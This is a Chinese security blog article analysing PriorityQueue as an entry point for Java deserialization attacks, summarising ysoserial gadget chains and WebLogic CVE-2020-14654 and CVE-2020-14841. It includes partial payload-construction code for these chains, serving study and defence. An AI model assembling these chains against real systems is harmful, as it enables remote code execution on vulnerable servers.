> 原文链接: https://www.anquanke.com//post/id/250800 


# 反序列化入口PriorityQueue分析及相关Gadget总结


                                阅读量   
                                **18109**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t0185005d457da375ac.png)](https://p4.ssl.qhimg.com/t0185005d457da375ac.png)



## 一、前言

最近分析了下Weblogic CVE-2020-14654和CVE-2020-14841的Gadget，里面都用到了PriorityQueue作为入口。在ysoserial中也有不少链用到了PriorityQueue，这里做下分析和总结。



## 二、PriorityQueue

PriorityQueue是一个用来处理优先队列的类，位于java.util包中。PriorityQueue其本质还是数组，数据结构其实是二叉堆。

[![](https://p1.ssl.qhimg.com/t018970c7653d8d52c7.png)](https://p1.ssl.qhimg.com/t018970c7653d8d52c7.png)

PriorityQueue中跟反序列漏洞相关的属性和方法如下：

```
// 属性
transient Object[] queue; //队列
private int size = 0; //队列元素个数
private final Comparator&lt;? super E&gt; comparator; //比较器
// 方法
java.util.PriorityQueue.heapify //堆排序
java.util.PriorityQueue.siftDown //比较节点
java.util.PriorityQueue.siftDownUsingComparator
java.util.PriorityQueue.readObject //反序列化读取
```

### <a class="reference-link" name="PriorityQueue.heapify%E6%9C%80%E5%B0%8F%E5%A0%86%E6%8E%92%E5%BA%8F"></a>PriorityQueue.heapify最小堆排序

heapify的作用是排序，调整优先队列的节点保证是一个最小堆，从而建立一个优先队列。其排序的过程是将一个节点和它的子节点进行比较调整，保证它比它所有的子节点都要小，这个调整的顺序是从当前节点向下，一直调整到叶节点。

heapify主要调用siftDown处理。siftDown对有比较器comparator和没有比较器的情况做了分类处理。

```
private void heapify() `{`
    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
        siftDown(i, (E) queue[i]);
`}`

private void siftDown(int k, E x) `{`
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
`}`
```

siftDownComparable主要处理一些常见类型的排序，被比较的实例的类都需要实现Comparable接口。

```
private void siftDownComparable(int k, E x) `{`
    Comparable&lt;? super E&gt; key = (Comparable&lt;? super E&gt;)x;
    int half = size &gt;&gt;&gt; 1;        // loop while a non-leaf
    while (k &lt; half) `{`
        // 左节点
        int child = (k &lt;&lt; 1) + 1; // assume left child is least
        Object c = queue[child];
        // 右节点
        int right = child + 1;
        // 调用Comparable.compareTo比较
        if (right &lt; size &amp;&amp; ((Comparable&lt;? super E&gt;) c).compareTo((E) queue[right]) &gt; 0)
            // 左节点&gt;右节点，调整当前节点值是右节点的值，也就是小的那个
            c = queue[child = right];
        if (key.compareTo((E) c) &lt;= 0)
            break;
        //左节点的值赋给当前节点
        queue[k] = c;
        k = child;
    `}`
    queue[k] = key;
`}`
```

siftDownUsingComparator主要用比较器Comparator来进行排序，如下会调用comparator.compare方法来处理。

```
private void siftDownUsingComparator(int k, E x) `{`
    int half = size &gt;&gt;&gt; 1;
    while (k &lt; half) `{`
        // 左节点
        int child = (k &lt;&lt; 1) + 1;
        Object c = queue[child];
        // 右节点
        int right = child + 1;
        // 调用comparator.compare方法比较左右节点
        if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0)
            // 左节点&gt;右节点，调整当前节点值是右节点的值，也就是小的那个
            c = queue[child = right];
        // 调用comparator.compare方法比较当前节点和c
        if (comparator.compare(x, (E) c) &lt;= 0)
            break;
        queue[k] = c;
        k = child;
    `}`
    queue[k] = x;
`}`
```

### <a class="reference-link" name="PriorityQueue%E7%9A%84writeObject%E5%92%8CreadObject"></a>PriorityQueue的writeObject和readObject

PriorityQueue处理反序列化时比较简单，主要是两部分：读取元素个数来创建一个数组，并将元素读取后赋值给数组，这是一个初始队列，第二部分是调用heapify将队列进行最小堆排序。

```
private void writeObject(java.io.ObjectOutputStream s)
    throws java.io.IOException `{`
    // 调用ObjectOutputStream.defaultWriteObject写入PriorityQueue的可序列化属性信息
    s.defaultWriteObject();

    // 写入数组长度
    s.writeInt(Math.max(2, size + 1));

    // 按顺序写入队列所有元素
    for (int i = 0; i &lt; size; i++)
        s.writeObject(queue[i]);
`}`

private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException `{`
    //读取size及其他属性
    s.defaultReadObject();
   //读数组长度
    s.readInt();
    //创建一个长度为size的数组
    queue = new Object[size];
    //读取所有元素
    for (int i = 0; i &lt; size; i++)
        queue[i] = s.readObject();
    //排序
    heapify();
`}`
```



## 三、PriorityQueue和Gadget关系

ysoserial中以PriorityQueue作为反序列化入口的有：CommonsBeanutils1、CommonsCollections2、CommonsCollections4、BeanShell1、Jython1。

[![](https://p0.ssl.qhimg.com/t019c9285bca9b7d46c.png)](https://p0.ssl.qhimg.com/t019c9285bca9b7d46c.png)

### <a class="reference-link" name="CommonsBeanutils1%EF%BC%9A"></a>CommonsBeanutils1：

以PriorityQueue作为入口，以BeanComparator为Comparator比较器，调用BeanComparator.compare，BeanComparator.compare通过PropertyUtilsBean可调用Method.invoke。

```
final BeanComparator comparator = new BeanComparator("lowestSetBit");
final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
queue.add(new BigInteger("1"));
queue.add(new BigInteger("1"));
Reflections.setFieldValue(comparator, "property", "outputProperties");
final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
queueArray[0] = templates;
queueArray[1] = templates;
```

### <a class="reference-link" name="CommonsCollections2%EF%BC%9A"></a>CommonsCollections2：

以PriorityQueue作为入口，TransformingComparator作为Comparator，调用TransformingComparator.compare，该方法可调用InvokerTransformer.transform从而调用Method.invoke。

```
final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));
queue.add(1);
queue.add(1);
Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
queueArray[0] = templates;
queueArray[1] = 1;
```

### <a class="reference-link" name="CommonsCollections4%EF%BC%9A"></a>CommonsCollections4：

和CommonsCollections2一样，都是以TransformingComparator作为Comparator只不过后面没有调用invoke，而是利用了TrAXFilter.TrAXFilter，该方法对TransformerImpl进行了实例化。

```
ChainedTransformer chain = new ChainedTransformer(new Transformer[] `{` constant, instantiate `}`);
PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(chain));
queue.add(1);
queue.add(1);
```

### <a class="reference-link" name="BeanShell1%EF%BC%9A"></a>BeanShell1：

以PriorityQueue作为入口，其属性comparator被代理给XThis.Handler处理从而调用invoke。

```
Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]`{`Comparator.class`}`, handler);

final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);
Object[] queue = new Object[] `{`1,1`}`;
Reflections.setFieldValue(priorityQueue, "queue", queue);
Reflections.setFieldValue(priorityQueue, "size", 2);
```

### <a class="reference-link" name="Jython1%EF%BC%9A"></a>Jython1：

与BeanShell1类似，以PriorityQueue作为入口，其属性comparator被代理给PyFunction.Handler处理，从而调用invoke。

```
PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);
Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]`{`Comparator.class`}`, handler);
PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);
Object[] queue = new Object[] `{`1,1`}`;
Reflections.setFieldValue(priorityQueue, "queue", queue);
Reflections.setFieldValue(priorityQueue, "size", 2);
```

除了上面的ysoserial，Weblogic CVE-2020-14654和CVE-2020-14841如下。

### <a class="reference-link" name="Weblogic%20CVE-2020-14654"></a>Weblogic CVE-2020-14654

以PriorityQueue作为入口，ExtractorComparator作为Comparator，调用ExtractorComparator.compare，可通过UniversalExtractor.extract调用invoke。

```
UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);
final ExtractorComparator comparator = new ExtractorComparator(extractor);
final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
Object[] q = new Object[]`{`rowSet, rowSet`}`;
Reflections.setFieldValue(queue, "queue", q);
Reflections.setFieldValue(queue, "size", 2);
```

### <a class="reference-link" name="Weblogic%20CVE-2020-14841"></a>Weblogic CVE-2020-14841

以PriorityQueue作为入口，ExtractorComparator作为Comparator，调用ExtractorComparator.compare，可通过LockVersionExtractor.extract调用invoke

```
LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, "xxx");
ExtractorComparator comparator = new ExtractorComparator(extractor);
PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
Object[] q = new Object[]`{`jdbcRowSet, 1`}`;
Reflections.setFieldValue(queue, "queue", q);
Reflections.setFieldValue(queue, "size", 2);
```

仔细观察其实可以看到每个PriorityQueue都是添加了2个元素，不难理解，在PriorityQueue.heapify中必须要有2个及以上元素才会调用siftDown，并且比较也必须是至少两个元素的比较。



## 四、总结

在第三部分分析的所有gadget中，除了CommonsCollections4外，都有一个共同点：从`PriorityQueue.siftDownUsingComparator`调用比较器的compare方法，最终到危险方法Method.invoke，我们可以通过构造Comparator完成动态执行。

```
PriorityQueue.siftDownUsingComparator -&gt; Comparator.compare -&gt; XxxComparator.compare -&gt;... -&gt;Method.invoke
```



## 参考链接：

[https://zhuanlan.zhihu.com/p/25843530](https://zhuanlan.zhihu.com/p/25843530)<br>[https://blog.csdn.net/kobejayandy/article/details/46832797](https://blog.csdn.net/kobejayandy/article/details/46832797)<br>[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
